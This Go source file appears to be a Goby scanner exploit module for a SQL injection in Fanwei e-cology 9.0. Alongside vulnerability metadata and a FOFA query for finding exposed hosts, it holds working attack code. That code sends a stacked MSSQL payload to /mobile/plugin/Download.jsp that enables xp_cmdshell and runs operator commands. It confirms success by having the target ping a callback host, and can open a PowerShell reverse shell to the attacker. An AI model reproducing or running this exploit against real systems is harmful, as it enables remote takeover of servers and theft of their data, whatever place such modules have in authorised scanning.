package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "E-cology 9.0 SQL Injection Leading To Command Execution Vulnerability",
    "Description": "<p>Fanwei e-cology 9.0 is a large-scale distributed application based on J2EE architecture launched by Shanghai Fanwei Network Co., Ltd. Users can read and process OA's workflow, news, contacts and other information. </p><p>There is a SQL injection in Fanwei e-cology 9.0 version. In addition to the SQL injection vulnerability, an attacker can use the SQL injection vulnerability to obtain information in the database (e.g., administrator backend passwords, site user personal information), or even write a Trojan horse to the server with high privileges to further gain access to the server system.</p>",
    "Impact": "E-cology 9.0 SQL Injection Leading To Command Execution Vulnerability",
    "Recommendation": "<p>1, the official has not yet fixed the vulnerability, please contact the vendor to fix the vulnerability: <a href=\"http://www.wantit.com.cn/\">http://www.wantit.com.cn/</a></p><p>2、Deploy Web application firewall to monitor database operations.</p><p>3、If not necessary, prohibit public network access to the system.</p>",
    "Product": "e-cology 9.0",
    "VulType": [
        "SQL Injection"
    ],
    "Tags": [
        "SQL Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "泛微 e-cology 9.0 sql 注入导致的 rce 漏洞",
            "Description": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\"><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">&nbsp;</span>泛微 e-cology 9.0&nbsp;</span>是上海泛微网络有限公司推出的一个基于J2EE架构的大型分布式应用。用户可以阅读和处理OA的工作流程、新闻、联系人等各类信息。&nbsp;</p><p>泛微 e-cology 9.0 版本存在一处SQL注入。攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限<br></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Product": "e-cology 9.0",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "E-cology 9.0 SQL Injection Leading To Command Execution Vulnerability",
            "Description": "<p>Fanwei e-cology 9.0 is a large-scale distributed application based on J2EE architecture launched by Shanghai Fanwei Network Co., Ltd. Users can read and process OA's workflow, news, contacts and other information.&nbsp;</p><p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">There is a SQL injection in Fanwei e-cology 9.0 version. In addition to the SQL injection vulnerability, an attacker can use the SQL injection vulnerability to obtain information in the database (e.g., administrator backend passwords, site user personal information), or even write a Trojan horse to the server with high privileges to further gain access to the server system.</span><br></p>",
            "Impact": "E-cology 9.0 SQL Injection Leading To Command Execution Vulnerability",
            "Recommendation": "<p>1, the official has not yet fixed the vulnerability, please contact the vendor to fix the vulnerability: <a href=\"http://www.wantit.com.cn/\">http://www.wantit.com.cn/</a></p><p>2、Deploy Web application firewall to monitor database operations.</p><p>3、If not necessary, prohibit public network access to the system.</p>",
            "Product": "e-cology 9.0",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "FofaQuery": "body=\"/wui/index.html#/?logintype=1\" && body=\"/system/index_wev8.js\"",
    "GobyQuery": "body=\"/wui/index.html#/?logintype=1\" && body=\"/system/index_wev8.js\"",
    "Author": "bablish",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2022-07-26",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.3",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "self_shell",
            "type": "input",
            "value": "ping xxxxx",
            "show": "AttackType=self_shell"
        },
        {
            "name": "AttackType",
            "type": "select",
            "value": "goby_shell,self_shell",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10501"
}`

	randomHex := goutils.RandomHexString(6)

	doGet := func(u *httpclient.FixUrl, payload string) bool {
		vulpath := `/mobile/plugin/Download.jsp?sessionkey=1'%20EXEC%20sp_configure%20'show%20advanced%20options',1%20RECONFIGURE%20EXEC%20sp_configure%20'xp_cmdshell',1%20RECONFIGURE%20exec%20master..xp_cmdshell%20'`
		if _, err := httpclient.SimpleGet(u.FixedHostInfo + vulpath + url.QueryEscape(payload)); err == nil {
			return true
		}
		return false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			checkUrl, _ := godclient.GetGodCheckURL(randomHex)
			cmd := "ping " + checkUrl
			fmt.Println(cmd)
			doGet(u, cmd)
			return godclient.PullExists(randomHex, time.Second*20)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if stepLogs.Params["AttackType"].(string) == "self_shell" {
				cmd := stepLogs.Params["self_shell"].(string)
				log.Println("use self shell :" + cmd)
				if doGet(expResult.HostInfo, cmd) {
					expResult.Output = "Please wait for the reverse shell on the remote machine"
					expResult.Success = true
					return expResult
				}
				expResult.Output = "err"
				return expResult
			}
			waitSessionCh := make(chan string)
			if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) == 0 {
				log.Println("[WARNING] godclient bind failed", err)
			} else {
				cmd := godclient.ReverseTCPByPowershell(rp)
				doGet(expResult.HostInfo, cmd)
				select {
				case webConsleID := <-waitSessionCh:
					log.Println("[DEBUG] session created at:", webConsleID)
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
				}
			}
			return expResult
		},
	))
}
